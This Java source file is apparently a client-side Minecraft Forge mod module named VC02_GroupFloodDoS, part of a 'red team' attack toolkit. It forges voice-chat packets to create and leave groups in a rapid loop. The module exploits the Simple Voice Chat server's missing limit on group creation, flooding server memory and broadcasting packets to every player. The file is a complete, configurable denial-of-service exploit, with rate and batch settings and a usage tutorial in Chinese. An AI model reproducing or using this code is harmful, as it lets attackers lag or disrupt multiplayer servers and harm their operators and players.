package com.redblue.red.modules.voicechat;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.network.chat.Component;
import net.minecraft.network.chat.Style;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;
import java.util.concurrent.ThreadLocalRandom;

/**
 * VC-02: Group Flood DoS
 *
 * Vulnerability: ServerGroupManager has no limit on group creation count per player.
 * Each CreateGroupPacket triggers broadcastAddGroup() to ALL online players.
 * Groups persist in memory until cleanup (only on leave/logout).
 *
 * Attack: Rapidly create groups -> leave -> create, flooding server memory
 * and broadcasting AddGroupPacket to all clients causing lag.
 *
 * Channels:
 *   voicechat:create_group (CreateGroupPacket) - TCP
 *   voicechat:leave_group  (LeaveGroupPacket)  - TCP
 *
 * Wire format (CreateGroupPacket):
 *   String(name, max 512) + Boolean(hasPassword) + [if true] String(password, max 512) + Short(type)
 *
 * Wire format (LeaveGroupPacket):
 *   (empty)
 */
public class VC02_GroupFloodDoS implements AttackModule {

    private static final ResourceLocation CREATE_CHANNEL =
        new ResourceLocation("voicechat", "create_group");
    private static final ResourceLocation LEAVE_CHANNEL =
        new ResourceLocation("voicechat", "leave_group");

    // Group name must match: ^[^\n\r\t\s][^\n\r\t]{0,23}$
    private static final String CHARS = "abcdefghijklmnopqrstuvwxyz0123456789";

    private long lastTick = 0;
    private int totalCreated = 0;
    private boolean inCreatePhase = true;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger", "确认: 这会导致全服卡顿", false),
        ConfigParam.ofInt("interval", "创建间隔(tick)", 2, 1, 40),
        ConfigParam.ofInt("batch_size", "每次批量创建数", 1, 1, 10),
        ConfigParam.ofInt("max_groups", "最大创建数量", 500, 10, 10000),
        ConfigParam.ofEnum("type", "群组类型", "NORMAL",
            "NORMAL", "OPEN", "ISOLATED"),
        ConfigParam.ofBool("auto_leave", "自动离开(保留群组)", true)
    );

    @Override public String id() { return "vc02_group_flood"; }
    @Override public String name() { return "群组洪泛DoS"; }
    @Override public String description() { return "无限创建群组导致内存泄漏和全服广播风暴"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 勾选「确认」复选框\n"
            + "2. 启用模块, tick循环自动创建群组\n"
            + "3. 每创建一个群组, 服务端会向全服广播AddGroupPacket\n"
            + "4. 开启「自动离开」后, 创建->离开->创建循环\n"
            + "   离开后群组不会立即清理, 持续占用内存\n\n"
            + "[原理]\n"
            + "ServerGroupManager.addGroup() 无数量限制.\n"
            + "每次创建触发 broadcastAddGroup() 向全服发包.\n"
            + "cleanupGroups() 仅在 leaveGroup/logout 时调用,\n"
            + "且只清理无人的非persistent群组.\n"
            + "快速创建->离开循环可积累大量群组对象.\n\n"
            + "[影响]\n"
            + "- 服务端内存持续增长\n"
            + "- 全服客户端收到大量AddGroupPacket广播\n"
            + "- cleanupGroups的stream操作随群组数增加而变慢";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("voicechat");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) {
            chat(mc, "请先勾选确认复选框");
            return;
        }
        totalCreated = 0;
        inCreatePhase = true;
        chat(mc, "开始群组洪泛攻击");
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;

        int maxGroups = getParam("max_groups").map(ConfigParam::getInt).orElse(500);
        if (totalCreated >= maxGroups) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(2);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;

        boolean autoLeave = getParam("auto_leave").map(ConfigParam::getBool).orElse(true);

        if (autoLeave && !inCreatePhase) {
            // Leave phase: send LeaveGroupPacket
            sendLeaveGroup();
            inCreatePhase = true;
            return;
        }

        // Create phase
        int batch = getParam("batch_size").map(ConfigParam::getInt).orElse(1);
        String typeStr = getParam("type").map(ConfigParam::getString).orElse("NORMAL");
        short typeVal = switch (typeStr) {
            case "OPEN" -> 1;
            case "ISOLATED" -> 2;
            default -> 0; // NORMAL
        };

        for (int i = 0; i < batch && totalCreated < maxGroups; i++) {
            sendCreateGroup(randomGroupName(), typeVal);
            totalCreated++;
        }

        if (autoLeave) {
            inCreatePhase = false;
        }

        if (totalCreated % 50 == 0) {
            chat(mc, "已创建 " + totalCreated + " / " + maxGroups + " 个群组");
        }
    }

    private void sendCreateGroup(String name, short type) {
        PacketForge.send(CREATE_CHANNEL, buf -> {
            // CreateGroupPacket wire format:
            // String(name, max 512) + Boolean(hasPassword) + Short(type)
            buf.writeUtf(name, 512);
            buf.writeBoolean(false); // no password
            buf.writeShort(type);
        });
    }

    private void sendLeaveGroup() {
        PacketForge.send(LEAVE_CHANNEL, buf -> {
            // LeaveGroupPacket: empty body
        });
    }

    private String randomGroupName() {
        // Must match ^[^\n\r\t\s][^\n\r\t]{0,23}$
        // Generate 8-16 char random name
        ThreadLocalRandom rng = ThreadLocalRandom.current();
        int len = rng.nextInt(8, 17);
        StringBuilder sb = new StringBuilder(len);
        for (int i = 0; i < len; i++) {
            sb.append(CHARS.charAt(rng.nextInt(CHARS.length())));
        }
        return sb.toString();
    }

    private static void chat(Minecraft mc, String msg) {
        if (mc.player != null) {
            mc.player.displayClientMessage(
                Component.literal("[VC02] " + msg)
                    .withStyle(Style.EMPTY.withColor(0xFF5555)),
                false
            );
        }
    }
}
